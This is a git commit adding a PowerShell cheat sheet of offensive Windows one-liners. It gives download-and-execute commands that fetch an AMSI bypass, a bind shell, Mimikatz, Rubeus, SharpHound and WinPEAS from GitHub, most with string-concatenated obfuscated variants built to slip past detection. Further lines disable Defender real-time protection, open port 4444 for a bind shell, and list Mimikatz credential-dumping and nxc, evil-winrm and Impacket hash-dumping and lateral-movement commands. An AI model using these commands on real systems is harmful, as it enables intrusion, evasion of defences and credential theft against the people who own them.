5cee0ddd6394170be1ca0feefd68614fba2cfb35
GLDXi <w.brodier@gmail.com>
2026-08-05 10:34:18 +0200

    Add files via upload

---
+++ UsefulOneLiners/OneLiners.ps1
@@ -0,0 +1,157 @@
+# A list of Commans / One-Liners for Windows
+
+# Download and Execute a script from github | Amsi Bypass
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/GLDXi/WinTools/main/ObfIsmaBypass.ps1')
+#Obfsucated version
+$aaaaa = "I" + "E" + "X"; $bbbbb = "N" + "e" + "w" + "-" + "O" + "b" + "j" + "e" + "c" + "t"; $ccccc = "N" + "e" + "t" + "." + "W" + "e" + "b" + "c" + "l" + "i" + "e" + "n" + "t"; $ddddd = "D" + "o" + "w" + "n" + "l" + "o" + "a" + "d" + "S" + "t" + "r" + "i" + "n" + "g"; $eeeee = "h" + "t" + "t" + "p" + "s" + ":" + "/" + "/" + "r" + "a" + "w" + "." + "g" + "i" + "t" + "h" + "u" + "b" + "." + "c" + "o" + "m" + "/" + "G" + "L" + "D" + "X" + "i" + "/" + "W" + "i" + "n" + "T" + "o" + "o" + "l" + "s" + "/" + "m" + "a" + "i" + "n" + "/" + "O" + "b" + "f" + "I" + "s" + "m" + "a" + "B" + "y" + "p" + "a" + "s" + "s" + "." + "p" + "s" + "1"; &$aaaaa (&$bbbbb $ccccc).$ddddd($eeeee)
+
+
+# Download and Execute a script from github | Bind Shell
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/GLDXi/WinTools/main/BindShell.ps1')
+#Obfsucated version
+$aaaaa = "I" + "E" + "X"; $bbbbb = "N" + "e" + "w" + "-" + "O" + "b" + "j" + "e" + "c" + "t"; $ccccc = "N" + "e" + "t" + "." + "W" + "e" + "b" + "c" + "l" + "i" + "e" + "n" + "t"; $ddddd = "D" + "o" + "w" + "n" + "l" + "o" + "a" + "d" + "S" + "t" + "r" + "i" + "n" + "g"; $eeeee = "h" + "t" + "t" + "p" + "s" + ":" + "/" + "/" + "r" + "a" + "w" + "." + "g" + "i" + "t" + "h" + "u" + "b" + "." + "c" + "o" + "m" + "/" + "G" + "L" + "D" + "X" + "i" + "/" + "W" + "i" + "n" + "T" + "o" + "o" + "l" + "s" + "/" + "m" + "a" + "i" + "n" + "/" + "B" + "i" + "n" + "d" + "S" + "h" + "e" + "l" + "l" + "." + "p" + "s" + "1"; &$aaaaa (&$bbbbb $ccccc).$ddddd($eeeee)
+
+# Download and Execute a script from github | BYOVDriver Check
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/GLDXi/WinTools/main/BYOVDriver_Checker.ps1')
+
+
+# Download and Execute a script from github | Mimikatz
+(New-Object Net.Webclient).DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip', 'C:\Temp\mimikatz.zip'); Expand-Archive -Path 'C:\Temp\mimikatz.zip' -DestinationPath 'C:\Temp\mimikatz'; & 'C:\Temp\mimikatz\x64\mimikatz.exe'
+#Obfsucated version
+$aaaaa = "N" + "e" + "w" + "-" + "O" + "b" + "j" + "e" + "c" + "t"; $bbbbb = "N" + "e" + "t" + "." + "W" + "e" + "b" + "c" + "l" + "i" + "e" + "n" + "t"; $ccccc = "D" + "o" + "w" + "n" + "l" + "o" + "a" + "d" + "F" + "i" + "l" + "e"; $ddddd = "h" + "t" + "t" + "p" + "s" + ":" + "/" + "/" + "g" + "i" + "t" + "h" + "u" + "b" + "." + "c" + "o" + "m" + "/" + "g" + "e" + "n" + "t" + "i" + "l" + "k" + "i" + "w" + "i" + "/" + "m" + "i" + "m" + "i" + "k" + "a" + "t" + "z" + "/" + "r" + "e" + "l" + "e" + "a" + "s" + "e" + "s" + "/" + "d" + "o" + "w" + "n" + "l" + "o" + "a" + "d" + "/" + "2" + "." + "2" + "." + "0" + "-" + "2" + "0" + "2" + "2" + "0" + "9" + "1" + "9" + "/" + "m" + "i" + "m" + "i" + "k" + "a" + "t" + "z" + "_" + "t" + "r" + "u" + "n" + "k" + "." + "z" + "i" + "p";$eeeee = "C" + ":" + "\" + "T" + "e" + "m" + "p" + "\" + "M" + "i" + "m" + "i" + "k" + "a" + "t" + "z"; $fffff = "E" + "x" + "p" + "a" + "n" + "d" + "-" + "A" + "r" + "c" + "h" + "i" + "v" + "e"; $hhhhh = "C" + ":" + "\" + "T" + "e" + "m" + "p" + "\" + "M" + "i" + "m" + "i" + "k" + "a" + "t" + "z" + "\" + "x" + "6" + "4" + "\" + "M" + "i" + "m" + "i" + "k" + "a" + "t" + "z" + "." + "e" + "x" + "e" ; (&$aaaaa $bbbbb).$ccccc($ddddd, "$eeeee.zip"); &$fffff -Path "$eeeee.zip" -DestinationPath $eeeee; &$hhhhh
+
+
+
+# Download and Execute a script from github | Mimikatz powershell version PATCHED
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Gather/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
+# Jinx method
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/GLDXi/WinTools/refs/heads/main/Obf-Invoke-Jinx.ps1'); Invoke-Jinx
+
+
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/GLDXi/WinTools/refs/heads/main/IM.ps1');
+
+# Download and Execute a script from github | Invoke-Rubeus.ps1
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/refs/heads/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); Invoke-Rubeus
+
+# Download and Execute a script from github | SharpHound.ps1
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1'); Invoke-Bloodhound
+#Obfsucated version
+$aaaaa = "I" + "E" + "X"; $bbbbb = "N" + "e" + "w" + "-" + "O" + "b" + "j" + "e" + "c" + "t"; $ccccc = "N" + "e" + "t" + "." + "W" + "e" + "b" + "c" + "l" + "i" + "e" + "n" + "t"; $ddddd = "D" + "o" + "w" + "n" + "l" + "o" + "a" + "d" + "S" + "t" + "r" + "i" + "n" + "g"; $eeeee = "h" + "t" + "t" + "p" + "s" + ":" + "/" + "/" + "r" + "a" + "w" + "." + "g" + "i" + "t" + "h" + "u" + "b" + "u" + "s" + "e" + "r" + "c" + "o" + "n" + "t" + "e" + "n" + "t" +"."  +"c"+"o"+"m"+"/"+"S"+"p"+"e"+"c"+"t"+"e"+"r"+"O"+"p"+"s"+"/"+"B"+"l"+"o"+"o"+"d"+"H"+"o"+"u"+"n"+"d"+ "-" + "L" + "e" + "g" + "a" + "c" + "y" + "/" + "r" + "e" + "f" + "s" + "/" + "h" + "e" + "a" + "d" + "s" + "/"+ "m" + "a" + "s" + "t" + "e" + "r" + "/"+"C"+ "o"+ "l"+ "l"+ "e"+ "c"+ "t"+ "o"+ "r" +"s" + "/" +"S"+"h"+"a"+"r"+"p"+"H"+"o"+"u"+"n"+"d"+"."+"p"+"s"+"1"; &$aaaaa (&$bbbbb $ccccc).$ddddd($eeeee); $fffff = "I" + "n"+"v"+"o"+"k"+"e"+"-"+"B"+"l"+"o"+"o"+"d"+"H"+"o"+"u"+"n"+"d" ; &$fffff
+# Fork version
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1'); Invoke-Bloodhound
+
+
+#Download and Execute a script from github | SharpHound.exe
+(New-Object Net.Webclient).DownloadFile('https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.exe', 'C:\Temp\SharpHound.exe'); & 'C:\Temp\SharpHound.exe' -c All
+
+# Download and Execute a script from github | PrivescCheck.ps1
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1'); Invoke-PrivescCheck
+
+# Download and Execute a script from github | EdrChecker.ps1
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PwnDexter/Invoke-EDRChecker/refs/heads/master/Invoke-EDRChecker.ps1'); Invoke-EDRChecker
+
+
+#Download and Execute a script from github | WinPEAS
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1'); Invoke-WinPEAS
+#Obfsucated version
+$aaaaa = "I" + "E" + "X"; $bbbbb = "N" + "e" + "w" + "-" + "O" + "b" + "j" + "e" + "c" + "t"; $ccccc = "N" + "e" + "t" + "." + "W" + "e" + "b" + "c" + "l" + "i" + "e" + "n" + "t"; $ddddd = "D" + "o" + "w" + "n" + "l" + "o" + "a" + "d" + "S" + "t" + "r" + "i" + "n" + "g"; $eeeee = "h" + "t" + "t" + "p" + "s" + ":" + "/" + "/" + "r" + "a" + "w" + "." + "g" + "i" + "t" + "h" + "u" + "b" + "u" + "s" + "e" + "r" + "c" + "o" + "n" + "t" + "e" + "n" + "t" + "." + "c" + "o" + "m" + "/" + "p" + "e" + "a" + "s" + "s" + "-" + "n" + "g" + "/" + "P" + "E" + "A" + "S" + "S" + "-" + "n" + "g" + "/" + "r" + "e" + "f" + "s" + "/" + "h" + "e" + "a" + "d" + "s" + "/" + "m" + "a" + "s" + "t" + "e" + "r" + "/" + "w" + "i" + "n" + "P" + "E" + "A" + "S" + "/" + "w" + "i" + "n" + "P" + "E" + "A" + "S" + "p" + "s" + "1" + "/" + "w" + "i" + "n" + "P" + "E" + "A" + "S" + "." + "p" + "s" + "1"; &$aaaaa (&$bbbbb $ccccc).$ddddd($eeeee); $fffff = "I" + "n" + "v" + "o" + "k" + "e" + "-" + "W" + "i" + "n" + "P" + "E" + "A" + "S"; &$fffff
+# Jinx version
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/GLDXi/WinTools/refs/heads/main/OBF-WinJinx.ps1'); Invoke-Jinx
+
+# Download and Execute a script from github | WinPrivCheck.bat
+(New-Object Net.Webclient).DownloadFile('https://raw.githubusercontent.com/codingo/OSCP-2/refs/heads/master/Windows/WinPrivCheck.bat', 'C:\Temp\WinPrivCheck.bat'); & 'C:\Temp\WinPrivCheck.bat'
+
+# Download and Execute a script from github | MissingKbs.ps1
+(New-Object Net.Webclient).DownloadFile('https://raw.githubusercontent.com/bitsadmin/wesng/refs/heads/master/missingkbs.ps1', 'C:\Temp\missingkbs.ps1'); & 'C:\Temp\missingkbs.ps1'
+
+# Download and Execute a script from github | PE-Audit.ps1
+(New-Object Net.Webclient).DownloadFile('https://raw.githubusercontent.com/lof1sec/PE-Audit/refs/heads/main/PE-Audit.ps1', 'C:\Temp\PE-Audit.ps1'); & 'C:\Temp\PE-Audit.ps1'
+
+#Disable Windows Defender Real-Time Protection (Admin rights required)
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Inveigh - LLMNR/NBT-NS/mDNS Poisoner
+Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/refs/heads/master/PowerSharpBinaries/Invoke-Inveigh.ps1'); Invoke-Inveigh
+
+
+# Create a firewall rule for binding a shell on port 4444 (Admin rights required)
+New-NetFirewallRule -DisplayName "BindShell" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444
+
+
+
+# Mimikatz useful commands
+# Gain SeDebug privilege (Admin rights required)
+privilege::debug
+
+# Elevate privileges to SYSTEM (Admin rights required)
+token::elevate
+token::whoami
+
+# Dump credentials from the SAM database (Admin rights required)
+lsadump::sam
+lsadump::lsa
+lsadump::cache
+lsadump::secrets
+
+# Dump credentials from memory (Admin rights required)
+sekurlsa::logonpasswords
+sekurlsa::wdigest
+sekurlsa::kerberos
+sekurlsa::msv
+
+# Dump credentials from the vault (Admin rights required)
+vault::cred
+
+
+# NXC useful commands
+# SMB methods (Valid for winrm too)
+
+nxc smb 10.10.10.0/24 -u admin -H 'NTHASH' --shares
+nxc smb 10.10.10.0/24 -u admin -p 'password' --shares
+
+nxc smb 10.10.10.0/24 -u admin -H 'NTHASH' --lsa
+nxc smb 10.10.10.0/24 -u admin -p 'password' --lsa
+
+nxc smb 10.10.10.0/24 -u admin -H 'NTHASH' --sam
+nxc smb 10.10.10.0/24 -u admin -p 'password' --sam
+
+nxc smb 10.10.10.0/24 -u admin -H 'NTHASH' --ntds
+nxc smb 10.10.10.0/24 -u admin -p 'password' --ntds
+
+nxc smb 10.10.10.0/24 -u admin -H 'NTHASH' -x ipconfig
+nxc smb 10.10.10.0/24 -u admin -p 'password' -x ipconfig
+
+nxc smb 10.10.10.0/24 -u admin -H 'NTHASH' -X ipconfig (PS)
+nxc smb 10.10.10.0/24 -u admin -p 'password' -X ipconfig (PS)
+
+nxc smb 10.10.10.0/24 -u admin -H 'NTHASH' --exec-method wmiexec
+nxc smb 10.10.10.0/24 -u admin -p 'password' --exec-method wmiexec
+
+#Module options
+nxc smb 10.10.10.0/24 -u admin -H 'NTHASH' -M gpp_password (No admin rights required)
+nxc smb 10.10.10.0/24 -u admin -p 'password' -M gpp_password (No admin rights required)
+
+nxc smb 10.10.10.0/24 -u admin -H 'NTHASH' -M gpp_autologin (No admin rights required)
+nxc smb 10.10.10.0/24 -u admin -p 'password' -M gpp_password (No admin rights required)
+
+
+#evil-winrm useful commands
+evil-winrm -i 10.10.10.10 -u admin -H 'NTHASH'
+evil-winrm -i 10.10.10.10 -u admin -p 'password'
+
+evil-winrm -i 10.10.10.10 -u admin -H 'NTHASH' -s SPN_PREFIX
+evil-winrm -i 10.10.10.10 -u admin -p 'password' -s SPN_PREFIX
+
+
+#Impacket useful commands
+impacket-GetUserSPNs DOMAIN/user:password -outputfile krb.hash -target-domain domain.local
+
+#enum4linux useful commands
+enum4linux -u admin -p 'password' 10.10.10.10 -a
+
+#ldapdomaindump
+ldapdomaindump 10.10.10.10 -u 'DOMAIN\user' -p 'password' [-at SIMPLE]
+
+
+
+
